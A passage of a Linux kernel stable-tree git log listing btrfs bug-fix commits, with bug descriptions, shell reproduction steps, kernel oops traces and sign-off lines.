end up dereferencing the "pages" pointer when it has a NULL value. This
case happens when "start" has a value of 0 and we fail to allocate memory
for the "pages" pointer. When that happens we jump to the "cont" label and
then enter the "if (start == 0)" branch where we immediately call the
cow\_file\_range\_inline() function. If that function returns 0 (success
creating an inline extent) or an error (like -ENOMEM for example) we jump
to the "free\_pages\_out" label and then access "pages[i]" leading to a NULL
pointer dereference, since "nr\_pages" has a value greater than zero at
that point.
Fix this by setting "nr\_pages" to 0 when we fail to allocate memory for
the "pages" pointer.
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=201119
Fixes: 771ed689d2cd ("Btrfs: Optimize compressed writeback and reads")
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Liu Bo
Signed-off-by: Filipe Manana
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 07cf04229031af4b960ee093e665caa4c4371186
Author: Qu Wenruo
Date: Fri Aug 10 10:20:26 2018 +0800
btrfs: qgroup: Dirty all qgroups before rescan
commit 9c7b0c2e8dbfbcd80a71e2cbfe02704f26c185c6 upstream.
[BUG]
In the following case, rescan won't zero out the number of qgroup 1/0:
$ mkfs.btrfs -fq $DEV
$ mount $DEV /mnt
$ btrfs quota enable /mnt
$ btrfs qgroup create 1/0 /mnt
$ btrfs sub create /mnt/sub
$ btrfs qgroup assign 0/257 1/0 /mnt
$ dd if=/dev/urandom of=/mnt/sub/file bs=1k count=1000
$ btrfs sub snap /mnt/sub /mnt/snap
$ btrfs quota rescan -w /mnt
$ btrfs qgroup show -pcre /mnt
qgroupid rfer excl max\_rfer max\_excl parent child
-------- ---- ---- -------- -------- ------ -----
0/5 16.00KiB 16.00KiB none none --- ---
0/257 1016.00KiB 16.00KiB none none 1/0 ---
0/258 1016.00KiB 16.00KiB none none --- ---
1/0 1016.00KiB 16.00KiB none none --- 0/257
So far so good, but:
$ btrfs qgroup remove 0/257 1/0 /mnt
WARNING: quotas may be inconsistent, rescan needed
$ btrfs quota rescan -w /mnt
$ btrfs qgroup show -pcre /mnt
qgoupid rfer excl max\_rfer max\_excl parent child
-------- ---- ---- -------- -------- ------ -----
0/5 16.00KiB 16.00KiB none none --- ---
0/257 1016.00KiB 16.00KiB none none --- ---
0/258 1016.00KiB 16.00KiB none none --- ---
1/0 1016.00KiB 16.00KiB none none --- ---
^^^^^^^^^^ ^^^^^^^^ not cleared
[CAUSE]
Before rescan we call qgroup\_rescan\_zero\_tracking() to zero out all
qgroups' accounting numbers.
However we don't mark all qgroups dirty, but rely on rescan to do so.
If we have any high level qgroup without children, it won't be marked
dirty during rescan, since we cannot reach that qgroup.
This will cause QGROUP\_INFO items of childless qgroups never get updated
in the quota tree, thus their numbers will stay the same in "btrfs
qgroup show" output.
[FIX]
Just mark all qgroups dirty in qgroup\_rescan\_zero\_tracking(), so even if
we have childless qgroups, their QGROUP\_INFO items will still get
updated during rescan.
Reported-by: Misono Tomohiro
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Qu Wenruo
Reviewed-by: Misono Tomohiro
Tested-by: Misono Tomohiro
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 96437af32b61485d5dde5ec2b3d0c6388fbf7280
Author: Filipe Manana
Date: Tue Oct 9 15:05:29 2018 +0100
Btrfs: fix wrong dentries after fsync of file that got its parent replaced
commit 0f375eed92b5a407657532637ed9652611a682f5 upstream.
In a scenario like the following:
mkdir /mnt/A # inode 258
mkdir /mnt/B # inode 259
touch /mnt/B/bar # inode 260
sync
mv /mnt/B/bar /mnt/A/bar
mv -T /mnt/A /mnt/B
fsync /mnt/B/bar
After replaying the log we end up with file bar having 2 hard links, both
with the name 'bar' and one in the directory with inode number 258 and the
other in the directory with inode number 259. Also, we end up with the
directory inode 259 still existing and with the directory inode 258 still
named as 'A', instead of 'B'. In this scenario, file 'bar' should only
have one hard link, located at directory inode 258, the directory inode
259 should not exist anymore and the name for directory inode 258 should
be 'B'.
This incorrect behaviour happens because when attempting to log the old
parents of an inode, we skip any parents that no longer exist. Fix this
by forcing a full commit if an old parent no longer exists.
A test case for fstests follows soon.
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Filipe Manana
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 41bdbc9ea1ecc477e2c13fed4c08d4f5fbef3a59
Author: Filipe Manana
Date: Mon Oct 8 11:12:55 2018 +0100
Btrfs: fix warning when replaying log after fsync of a tmpfile
commit f2d72f42d5fa3bf33761d9e47201745f624fcff5 upstream.
When replaying a log which contains a tmpfile (which necessarily has a
link count of 0) we end up calling inc\_nlink(), at
fs/btrfs/tree-log.c:replay\_one\_buffer(), which produces a warning like
the following:
[195191.943673] WARNING: CPU: 0 PID: 6924 at fs/inode.c:342 inc\_nlink+0x33/0x40
[195191.943723] CPU: 0 PID: 6924 Comm: mount Not tainted 4.19.0-rc6-btrfs-next-38 #1
[195191.943724] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.11.2-0-gf9626ccb91-prebuilt.qemu-project.org 04/01/2014
[195191.943726] RIP: 0010:inc\_nlink+0x33/0x40
[195191.943728] RSP: 0018:ffffb96e425e3870 EFLAGS: 00010246
[195191.943730] RAX: 0000000000000000 RBX: ffff8c0d1e6af4f0 RCX: 0000000000000006
[195191.943731] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff8c0d1e6af4f0
[195191.943731] RBP: 0000000000000097 R08: 0000000000000001 R09: 0000000000000000
[195191.943732] R10: 0000000000000000 R11: 0000000000000000 R12: ffffb96e425e3a60
[195191.943733] R13: ffff8c0d10cff0c8 R14: ffff8c0d0d515348 R15: ffff8c0d78a1b3f8
[195191.943735] FS: 00007f570ee24480(0000) GS:ffff8c0dfb200000(0000) knlGS:0000000000000000
[195191.943736] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[195191.943737] CR2: 00005593286277c8 CR3: 00000000bb8f2006 CR4: 00000000003606f0
[195191.943739] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[195191.943740] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[195191.943741] Call Trace:
[195191.943778] replay\_one\_buffer+0x797/0x7d0 [btrfs]
[195191.943802] walk\_up\_log\_tree+0x1c1/0x250 [btrfs]
[195191.943809] ? rcu\_read\_lock\_sched\_held+0x3f/0x70
[195191.943825] walk\_log\_tree+0xae/0x1d0 [btrfs]
[195191.943840] btrfs\_recover\_log\_trees+0x1d7/0x4d0 [btrfs]
[195191.943856] ? replay\_dir\_deletes+0x280/0x280 [btrfs]
[195191.943870] open\_ctree+0x1c3b/0x22a0 [btrfs]
[195191.943887] btrfs\_mount\_root+0x6b4/0x800 [btrfs]
[195191.943894] ? rcu\_read\_lock\_sched\_held+0x3f/0x70
[195191.943899] ? pcpu\_alloc+0x55b/0x7c0
[195191.943906] ? mount\_fs+0x3b/0x140
[195191.943908] mount\_fs+0x3b/0x140
[195191.943912] ? \_\_init\_waitqueue\_head+0x36/0x50
[195191.943916] vfs\_kern\_mount+0x62/0x160
[195191.943927] btrfs\_mount+0x134/0x890 [btrfs]
[195191.943936] ? rcu\_read\_lock\_sched\_held+0x3f/0x70
[195191.943938] ? pcpu\_alloc+0x55b/0x7c0
[195191.943943] ? mount\_fs+0x3b/0x140
[195191.943952] ? btrfs\_remount+0x570/0x570 [btrfs]
[195191.943954] mount\_fs+0x3b/0x140
[195191.943956] ? \_\_init\_waitqueue\_head+0x36/0x50
[195191.943960] vfs\_kern\_mount+0x62/0x160
[195191.943963] do\_mount+0x1f9/0xd40
[195191.943967] ? memdup\_user+0x4b/0x70
[195191.943971] ksys\_mount+0x7e/0xd0
[195191.943974] \_\_x64\_sys\_mount+0x21/0x30
[195191.943977] do\_syscall\_64+0x60/0x1b0
[195191.943980] entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
[195191.943983] RIP: 0033:0x7f570e4e524a
[195191.943986] RSP: 002b:00007ffd83589478 EFLAGS: 00000206 ORIG\_RAX: 00000000000000a5
[195191.943989] RAX: ffffffffffffffda RBX: 0000563f335b2060 RCX: 00007f570e4e524a
[195191.943990] RDX: 0000563f335b2240 RSI: 0000563f335b2280 RDI: 0000563f335b2260
[195191.943992] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000020
[195191.943993] R10: 00000000c0ed0000 R11: 0000000000000206 R12: 0000563f335b2260
[195191.943994] R13: 0000563f335b2240 R14: 0000000000000000 R15: 00000000ffffffff
[195191.944002] irq event stamp: 8688
[195191.944010] hardirqs last enabled at (8687): [] console\_unlock+0x503/0x640
[195191.944012] hardirqs last disabled at (8688): [] trace\_hardirqs\_off\_thunk+0x1a/0x1c
[195191.944018] softirqs last enabled at (8638): [] \_\_set\_page\_dirty\_nobuffers+0x101/0x150
[195191.944020] softirqs last disabled at (8634): [] wb\_wakeup\_delayed+0x2e/0x60
[195191.944022] ---[ end trace 5d6e873a9a0b811a ]---
This happens because the inode does not have the flag I\_LINKABLE set,
which is a runtime only flag, not meant to be persisted, set when the
inode is created through open(2) if the flag O\_EXCL is not passed to it.
Except for the warning, there are no other consequences (like corruptions
or metadata inconsistencies).
Since it's pointless to replay a tmpfile as it would be deleted in a
later phase of the log replay procedure (it has a link count of 0), fix
this by not logging tmpfiles and if a tmpfile is found in a log (created
by a kernel without this change), skip the replay of the inode.
A test case for fstests follows soon.
Fixes: 471d557afed1 ("Btrfs: fix loss of prealloc extents past i\_size after fsync log replay")
CC: stable@vger.kernel.org # 4.18+
Reported-by: Martin Steigerwald
Link: https://lore.kernel.org/linux-btrfs/3666619.NTnn27ZJZE@merkaba/
Signed-off-by: Filipe Manana
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 09cbc39c1b7f70372c108910f41e774b62e2b2fb
Author: Josef Bacik
Date: Fri Sep 28 07:18:02 2018 -0400
btrfs: make sure we create all new block groups
commit 545e3366db823dc3342ca9d7fea803f829c9062f upstream.
Allocating new chunks modifies both the extent and chunk tree, which can
trigger new chunk allocations. So instead of doing list\_for\_each\_safe,
just do while (!list\_empty()) so we make sure we don't exit with other
pending bg's still on our list.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Omar Sandoval
Reviewed-by: Liu Bo
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 302e6eaa09d85229d52e290e6c7c4338652569af
Author: Josef Bacik
Date: Fri Sep 28 07:18:00 2018 -0400
btrfs: reset max\_extent\_size on clear in a bitmap
commit 553cceb49681d60975d00892877d4c871bf220f9 upstream.
We need to clear the max\_extent\_size when we clear bits from a bitmap
since it could have been from the range that contains the
max\_extent\_size.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Liu Bo
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 6078b6126651588fb0131fbbb95ce17e2eb9498b
Author: Josef Bacik
Date: Fri Sep 28 07:17:49 2018 -0400
btrfs: protect space cache inode alloc with GFP\_NOFS
commit 84de76a2fb217dc1b6bc2965cc397d1648aa1404 upstream.
If we're allocating a new space cache inode it's likely going to be
under a transaction handle, so we need to use memalloc\_nofs\_save() in
order to avoid deadlocks, and more importantly lockdep messages that
make xfstests fail.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Omar Sandoval
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit ff9e68fd136b1f3db80d2a38cb10645d8eb7f858
Author: Josef Bacik
Date: Fri Sep 28 07:17:48 2018 -0400
btrfs: release metadata before running delayed refs
commit f45c752b65af46bf42963295c332865d95f97fff upstream.
We want to release the unused reservation we have since it refills the
delayed refs reserve, which will make everything go smoother when
running the delayed refs if we're short on our reservation.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Omar Sandoval
Reviewed-by: Liu Bo
Reviewed-by: Nikolay Borisov
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 07ddb36eb1507f40e725db3f8cebec236f86ee02
Author: Chris Mason
Date: Wed Jun 20 07:56:11 2018 -0700
Btrfs: don't clean dirty pages during buffered writes
commit 7703bdd8d23e6ef057af3253958a793ec6066b28 upstream.
During buffered writes, we follow this basic series of steps:
again:
lock all the pages
wait for writeback on all the pages
Take the extent range lock
wait for ordered extents on the whole range
clean all the pages
if (copy\_from\_user\_in\_atomic() hits a fault) {
drop our locks
goto again;
}
dirty all the pages
release all the locks
The extra waiting, cleaning and locking are there to make sure we don't
modify pages in flight to the drive, after they've been crc'd.
If some of the pages in the range were already dirty when the write
began, and we need to goto again, we create a window where a dirty page
has been cleaned and unlocked. It may be reclaimed before we're able to
lock it again, which means we'll read the old contents off the drive and
lose any modifications that had been pending writeback.
We don't actually need to clean the pages. All of the other locking in
place makes sure we don't start IO on the pages, so we can just leave
them dirty for the duration of the write.
Fixes: 73d59314e6ed (the original btrfs merge)
CC: stable@vger.kernel.org # v4.4+
Signed-off-by: Chris Mason
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 0efba7a66329dbadc17c059d14eea25a345d8e02
Author: Josef Bacik
Date: Wed Sep 12 10:45:45 2018 -0400
btrfs: wait on caching when putting the bg cache
commit 3aa7c7a31c26321696b92841d5103461c6f3f517 upstream.
While testing my backport I noticed there was a panic if I ran
generic/416 generic/417 generic/418 all in a row. This just happened to
uncover a race where we had outstanding IO after we destroy all of our
workqueues, and then we'd go to queue the endio work on those free'd
workqueues.
This is because we aren't waiting for the caching threads to be done
before freeing everything up, so to fix this make sure we wait on any
outstanding caching that's being done before we free up the block group,
so we're sure to be done with all IO by the time we get to
btrfs\_stop\_all\_workers(). This fixes the panic I was seeing
consistently in testing.
------------[ cut here ]------------
kernel BUG at fs/btrfs/volumes.c:6112!
SMP PTI
Modules linked in:
CPU: 1 PID: 27165 Comm: kworker/u4:7 Not tainted 4.16.0-02155-g3553e54a578d-dirty #875
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.11.0-2.el7 04/01/2014
Workqueue: btrfs-cache btrfs\_cache\_helper
RIP: 0010:btrfs\_map\_bio+0x346/0x370
RSP: 0000:ffffc900061e79d0 EFLAGS: 00010202
RAX: 0000000000000000 RBX: ffff880071542e00 RCX: 0000000000533000
RDX: ffff88006bb74380 RSI: 0000000000000008 RDI: ffff880078160000
RBP: 0000000000000001 R08: ffff8800781cd200 R09: 0000000000503000
R10: ffff88006cd21200 R11: 0000000000000000 R12: 0000000000000000
R13: 0000000000000000 R14: ffff8800781cd200 R15: ffff880071542e00
FS: 0000000000000000(0000) GS:ffff88007fd00000(0000) knlGS:0000000000000000
CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 000000000817ffc4 CR3: 0000000078314000 CR4: 00000000000006e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
btree\_submit\_bio\_hook+0x8a/0xd0
submit\_one\_bio+0x5d/0x80
read\_extent\_buffer\_pages+0x18a/0x320
btree\_read\_extent\_buffer\_pages+0xbc/0x200
? alloc\_extent\_buffer+0x359/0x3e0
read\_tree\_block+0x3d/0x60
read\_block\_for\_search.isra.30+0x1a5/0x360
btrfs\_search\_slot+0x41b/0xa10
btrfs\_next\_old\_leaf+0x212/0x470
caching\_thread+0x323/0x490
normal\_work\_helper+0xc5/0x310
process\_one\_work+0x141/0x340
worker\_thread+0x44/0x3c0
kthread+0xf8/0x130
? process\_one\_work+0x340/0x340
? kthread\_bind+0x10/0x10
ret\_from\_fork+0x35/0x40
RIP: btrfs\_map\_bio+0x346/0x370 RSP: ffffc900061e79d0
---[ end trace 827eb13e50846033 ]---
Kernel panic - not syncing: Fatal exception
Kernel Offset: disabled
---[ end Kernel panic - not syncing: Fatal exception
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Josef Bacik
Reviewed-by: Omar Sandoval
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 112249f4f379e58f78a52ea46e2c1a7f5df830e4
Author: Jeff Mahoney
Date: Thu Sep 6 17:18:16 2018 -0400
btrfs: keep trim from interfering with transaction commits
commit fee7acc361314df6561208c2d3c0882d663dd537 upstream.
Commit 499f377f49f08 (btrfs: iterate over unused chunk space in FITRIM)
fixed free space trimming, but introduced latency when it was running.
This is due to it pinning the transaction using both a incremented
refcount and holding the commit root sem for the duration of a single
trim operation.
This was to ensure safety but it's unnecessary. We already hold the the
chunk mutex so we know that the chunk we're using can't be allocated
while we're trimming it.
In order to check against chunks allocated already in this transaction,
we need to check the pending chunks list. To to that safely without
joining the transaction (or attaching than then having to commit it) we
need to ensure that the dev root's commit root doesn't change underneath
us and the pending chunk lists stays around until we're done with it.
We can ensure the former by holding the commit root sem and the latter
by pinning the transaction. We do this now, but the critical section
covers the trim operation itself and we don't need to do that.
This patch moves the pinning and unpinning logic into helpers and unpins
the transaction after performing the search and check for pending
chunks.
Limiting the critical section of the transaction pinning improves the
latency substantially on slower storage (e.g. image files over NFS).
Fixes: 499f377f49f08 ("btrfs: iterate over unused chunk space in FITRIM")
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Jeff Mahoney
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 74a0609298dc0f38fa2c7484159fead5cedea6b6
Author: Jeff Mahoney
Date: Thu Sep 6 17:18:15 2018 -0400
btrfs: don't attempt to trim devices that don't support it
commit 0be88e367fd8fbdb45257615d691f4675dda062f upstream.
We check whether any device the file system is using supports discard in
the ioctl call, but then we attempt to trim free extents on every device
regardless of whether discard is supported. Due to the way we mask off
EOPNOTSUPP, we can end up issuing the trim operations on each free range
on devices that don't support it, just wasting time.
Fixes: 499f377f49f08 ("btrfs: iterate over unused chunk space in FITRIM")
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Jeff Mahoney
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 599c6e4376cbc9fcf3e2cb3ab986add45f036df6
Author: Jeff Mahoney
Date: Thu Sep 6 17:18:14 2018 -0400
btrfs: iterate all devices during trim, instead of fs\_devices::alloc\_list
commit d4e329de5e5e21594df2e0dd59da9acee71f133b upstream.
btrfs\_trim\_fs iterates over the fs\_devices->alloc\_list while holding the
device\_list\_mutex. The problem is that ->alloc\_list is protected by the
chunk mutex. We don't want to hold the chunk mutex over the trim of the
entire file system. Fortunately, the ->dev\_list list is protected by
the dev\_list mutex and while it will give us all devices, including
read-only devices, we already just skip the read-only devices. Then we
can continue to take and release the chunk mutex while scanning each
device.
Fixes: 499f377f49f ("btrfs: iterate over unused chunk space in FITRIM")
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Jeff Mahoney
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit d12a47554ea9d71cd7de7573d355ec13ac1e62d0
Author: Qu Wenruo
Date: Fri Sep 7 14:16:24 2018 +0800
btrfs: Ensure btrfs\_trim\_fs can trim the whole filesystem
commit 6ba9fc8e628becf0e3ec94083450d089b0dec5f5 upstream.
[BUG]
fstrim on some btrfs only trims the unallocated space, not trimming any
space in existing block groups.
[CAUSE]
Before fstrim\_range passed to btrfs\_trim\_fs(), it gets truncated to
range [0, super->total\_bytes). So later btrfs\_trim\_fs() will only be
able to trim block groups in range [0, super->total\_bytes).
While for btrfs, any bytenr aligned to sectorsize is valid, since btrfs
uses its logical address space, there is nothing limiting the location
where we put block groups.
For filesystem with frequent balance, it's quite easy to relocate all
block groups and bytenr of block groups will start beyond
super->total\_bytes.
In that case, btrfs will not trim existing block groups.
[FIX]
Just remove the truncation in btrfs\_ioctl\_fitrim(), so btrfs\_trim\_fs()
can get the unmodified range, which is normally set to [0, U64\_MAX].
Reported-by: Chris Murphy
Fixes: f4c697e6406d ("btrfs: return EINVAL if start > total\_bytes in fitrim ioctl")
CC:  # v4.4+
Signed-off-by: Qu Wenruo
Reviewed-by: Nikolay Borisov
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 89dbabf7e2c36298724d5026b0a3d7dcb035a7ed
Author: Qu Wenruo
Date: Fri Sep 7 14:16:23 2018 +0800
btrfs: Enhance btrfs\_trim\_fs function to handle error better
commit 93bba24d4b5ad1e5cd8b43f64e66ff9d6355dd20 upstream.
Function btrfs\_trim\_fs() doesn't handle errors in a consistent way. If
error happens when trimming existing block groups, it will skip the
remaining blocks and continue to trim unallocated space for each device.
The return value will only reflect the final error from device trimming.
This patch will fix such behavior by:
1) Recording the last error from block group or device trimming
The return value will also reflect the last error during trimming.
Make developer more aware of the problem.
2) Continuing trimming if possible
If we failed to trim one block group or device, we could still try
the next block group or device.
3) Report number of failures during block group and device trimming
It would be less noisy, but still gives user a brief summary of
what's going wrong.
Such behavior can avoid confusion for cases like failure to trim the
first block group and then only unallocated space is trimmed.
Reported-by: Chris Murphy
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Qu Wenruo
Reviewed-by: David Sterba
[ add bg\_ret and dev\_ret to the messages ]
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 449f9b8dcf15d02d64ccb111ed5191ae0d6f198d
Author: Jeff Mahoney
Date: Thu Sep 6 15:52:17 2018 -0400
btrfs: fix error handling in btrfs\_dev\_replace\_start
commit 5c06147128fbbdf7a84232c5f0d808f53153defe upstream.
When we fail to start a transaction in btrfs\_dev\_replace\_start, we leave
dev\_replace->replace\_start set to STARTED but clear ->srcdev and
->tgtdev. Later, that can result in an Oops in
btrfs\_dev\_replace\_progress when having state set to STARTED or SUSPENDED
implies that ->srcdev is valid.
Also fix error handling when the state is already STARTED or SUSPENDED
while starting. That, too, will clear ->srcdev and ->tgtdev even though
it doesn't own them. This should be an impossible case to hit since we
should be protected by the BTRFS\_FS\_EXCL\_OP bit being set. Let's add an
ASSERT there while we're at it.
Fixes: e93c89c1aaaaa (Btrfs: add new sources for device replace code)
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Jeff Mahoney
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit e7e2afa8f83c833bdd5c4467f1d9b02ffa0410f3
Author: Jeff Mahoney
Date: Thu Sep 6 16:59:33 2018 -0400
btrfs: fix error handling in free\_log\_tree
commit 374b0e2d6ba5da7fd1cadb3247731ff27d011f6f upstream.
When we hit an I/O error in free\_log\_tree->walk\_log\_tree during file system
shutdown we can crash due to there not being a valid transaction handle.
Use btrfs\_handle\_fs\_error when there's no transaction handle to use.
BUG: unable to handle kernel NULL pointer dereference at 0000000000000060
IP: free\_log\_tree+0xd2/0x140 [btrfs]
PGD 0 P4D 0
Oops: 0000 [#1] SMP DEBUG\_PAGEALLOC PTI
Modules linked in:
CPU: 2 PID: 23544 Comm: umount Tainted: G W 4.12.14-kvmsmall #9 SLE15 (unreleased)
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.0.0-prebuilt.qemu-project.org 04/01/2014
task: ffff96bfd3478880 task.stack: ffffa7cf40d78000
RIP: 0010:free\_log\_tree+0xd2/0x140 [btrfs]
RSP: 0018:ffffa7cf40d7bd10 EFLAGS: 00010282
RAX: 00000000fffffffb RBX: 00000000fffffffb RCX: 0000000000000002
RDX: 0000000000000000 RSI: ffff96c02f07d4c8 RDI: 0000000000000282
RBP: ffff96c013cf1000 R08: ffff96c02f07d4c8 R09: ffff96c02f07d4d0
R10: 0000000000000000 R11: 0000000000000002 R12: 0000000000000000
R13: ffff96c005e800c0 R14: ffffa7cf40d7bdb8 R15: 0000000000000000
FS: 00007f17856bcfc0(0000) GS:ffff96c03f600000(0000) knlGS:0000000000000000
CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000000060 CR3: 0000000045ed6002 CR4: 00000000003606e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
? wait\_for\_writer+0xb0/0xb0 [btrfs]
btrfs\_free\_log+0x17/0x30 [btrfs]
btrfs\_drop\_and\_free\_fs\_root+0x9a/0xe0 [btrfs]
btrfs\_free\_fs\_roots+0xc0/0x130 [btrfs]
? wait\_for\_completion+0xf2/0x100
close\_ctree+0xea/0x2e0 [btrfs]
? kthread\_stop+0x161/0x260
generic\_shutdown\_super+0x6c/0x120
kill\_anon\_super+0xe/0x20
btrfs\_kill\_super+0x13/0x100 [btrfs]
deactivate\_locked\_super+0x3f/0x70
cleanup\_mnt+0x3b/0x70
task\_work\_run+0x78/0x90
exit\_to\_usermode\_loop+0x77/0xa6
do\_syscall\_64+0x1c5/0x1e0
entry\_SYSCALL\_64\_after\_hwframe+0x42/0xb7
RIP: 0033:0x7f1784f90827
RSP: 002b:00007ffdeeb03118 EFLAGS: 00000246 ORIG\_RAX: 00000000000000a6
RAX: 0000000000000000 RBX: 0000556a60c62970 RCX: 00007f1784f90827
RDX: 0000000000000001 RSI: 0000000000000000 RDI: 0000556a60c62b50
RBP: 0000000000000000 R08: 0000000000000005 R09: 00000000ffffffff
R10: 0000556a60c63900 R11: 0000000000000246 R12: 0000556a60c62b50
R13: 00007f17854a81c4 R14: 0000000000000000 R15: 0000000000000000
RIP: free\_log\_tree+0xd2/0x140 [btrfs] RSP: ffffa7cf40d7bd10
CR2: 0000000000000060
Fixes: 681ae50917df9 ("Btrfs: cleanup reserved space when freeing tree log on error")
CC:  # v3.13
Signed-off-by: Jeff Mahoney
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 9fc2295c6ce8bbab9e6ffe633dd06fef0d63f64f
Author: Qu Wenruo
Date: Tue Aug 21 09:53:47 2018 +0800
btrfs: locking: Add extra check in btrfs\_init\_new\_buffer() to avoid deadlock
commit b72c3aba09a53fc7c1824250d71180ca154517a7 upstream.
[BUG]
For certain crafted image, whose csum root leaf has missing backref, if
we try to trigger write with data csum, it could cause deadlock with the
following kernel WARN\_ON():
WARNING: CPU: 1 PID: 41 at fs/btrfs/locking.c:230 btrfs\_tree\_lock+0x3e2/0x400
CPU: 1 PID: 41 Comm: kworker/u4:1 Not tainted 4.18.0-rc1+ #8
Workqueue: btrfs-endio-write btrfs\_endio\_write\_helper
RIP: 0010:btrfs\_tree\_lock+0x3e2/0x400
Call Trace:
btrfs\_alloc\_tree\_block+0x39f/0x770
\_\_btrfs\_cow\_block+0x285/0x9e0
btrfs\_cow\_block+0x191/0x2e0
btrfs\_search\_slot+0x492/0x1160
btrfs\_lookup\_csum+0xec/0x280
btrfs\_csum\_file\_blocks+0x2be/0xa60
add\_pending\_csums+0xaf/0xf0
btrfs\_finish\_ordered\_io+0x74b/0xc90
finish\_ordered\_fn+0x15/0x20
normal\_work\_helper+0xf6/0x500
btrfs\_endio\_write\_helper+0x12/0x20
process\_one\_work+0x302/0x770
worker\_thread+0x81/0x6d0
kthread+0x180/0x1d0
ret\_from\_fork+0x35/0x40
[CAUSE]
That crafted image has missing backref for csum tree root leaf. And
when we try to allocate new tree block, since there is no
EXTENT/METADATA\_ITEM for csum tree root, btrfs consider it's free slot
and use it.
The extent tree of the image looks like:
Normal image | This fuzzed image
----------------------------------+--------------------------------
BG 29360128 | BG 29360128
One empty slot | One empty slot
29364224: backref to UUID tree | 29364224: backref to UUID tree
Two empty slots | Two empty slots
29376512: backref to CSUM tree | One empty slot (bad type) <<<
29380608: backref to D\_RELOC tree | 29380608: backref to D\_RELOC tree
... | ...
Since bytenr 29376512 has no METADATA/EXTENT\_ITEM, when btrfs try to
alloc tree block, it's an valid slot for btrfs.
And for finish\_ordered\_write, when we need to insert csum, we try to CoW
csum tree root.
By accident, empty slots at bytenr BG\_OFFSET, BG\_OFFSET + 8K,
BG\_OFFSET + 12K is already used by tree block COW for other trees, the
next empty slot is BG\_OFFSET + 16K, which should be the backref for CSUM
tree.
But due to the bad type, btrfs can recognize it and still consider it as
an empty slot, and will try to use it for csum tree CoW.
Then in the following call trace, we will try to lock the new tree
block, which turns out to be the old csum tree root which is already
locked:
btrfs\_search\_slot() called on csum tree root, which is at 29376512
|- btrfs\_cow\_block()
|- btrfs\_set\_lock\_block()
| |- Now locks tree block 29376512 (old csum tree root)
|- \_\_btrfs\_cow\_block()
|- btrfs\_alloc\_tree\_block()
|- btrfs\_reserve\_extent()
| Now it returns tree block 29376512, which extent tree
| shows its empty slot, but it's already hold by csum tree
|- btrfs\_init\_new\_buffer()
|- btrfs\_tree\_lock()
| Triggers WARN\_ON(eb->lock\_owner == current->pid)
|- wait\_event()
Wait lock owner to release the lock, but it's
locked by ourself, so it will deadlock
[FIX]
This patch will do the lock\_owner and current->pid check at
btrfs\_init\_new\_buffer().
So above deadlock can be avoided.
Since such problem can only happen in crafted image, we will still
trigger kernel warning for later aborted transaction, but with a little
more meaningful warning message.
Link: https://bugzilla.kernel.org/show\_bug.cgi?id=200405
Reported-by: Xu Wen
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Qu Wenruo
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit a0d7061e2905dd43bced59e990a7b174b0984fcd
Author: Qu Wenruo
Date: Tue Aug 21 09:42:03 2018 +0800
btrfs: Handle owner mismatch gracefully when walking up tree
commit 65c6e82becec33731f48786e5a30f98662c86b16 upstream.
[BUG]
